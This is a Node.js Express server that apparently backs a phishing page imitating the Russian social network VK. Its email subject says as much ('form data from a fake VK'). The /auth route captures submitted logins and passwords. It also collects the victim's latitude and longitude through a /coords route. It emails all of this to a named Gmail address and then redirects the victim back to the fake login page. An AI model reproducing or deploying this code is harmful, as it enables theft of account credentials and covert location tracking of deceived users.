const express = require("express");
const bodyParser = require("body-parser");
const mailer = require("./nodeMailer");

let _data = null;
let coords = null;

const app = express();

app.listen(4000, (err) =>
  err ? console.error(err) : console.log("Server OK")
);

app.use(express.static(__dirname + "/styles"));
app.use(express.static(__dirname + "/images"));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.json());

app.get("/", async (req, res) => {
  try {
    return res.status(200).sendFile(__dirname + "/index.html");
  } catch (err) {
    console.error(err);
  }
});

app.post("/auth", async (req, res) => {
  try {
    _data = await req.body;

    if (!_data.login || !_data.password) {
      console.log(_data);

      _data = null;
      return res.status(301).redirect("/");
    }

    const message = {
      to: "klimovd131@gmail.com",
      subject: "Данные формы с фальшивого ВК",
      html: `
      <h1>Login: </h1> <b>${_data.login}</b>
      <h1>Password: </h1> <b>${_data.password}</b>
      ${
        coords
          ? ` <h1>Coords: </h1> 
        <b>Широта ${coords ? coords.sher : "Отсутствует"}</b>
        <b>Долгота ${coords ? coords.dol : "Отсутствует"}</b>`
          : `<h1>Координаты Отсутствуют</h1>`
      } `,
    };

    mailer(message);

    console.log(_data);

    return res.status(301).redirect("/");
  } catch (err) {
    console.error(err);
  }
});

app.post("/coords", async (req, res) => {
  try {
    coords = await req.body;
  } catch (err) {
    console.error(err);
  }
});

app.get("*", async (req, res) => {
  try {
    return res.status(404).sendFile(__dirname + "/error.html");
  } catch (err) {
    console.error(err);
  }
});
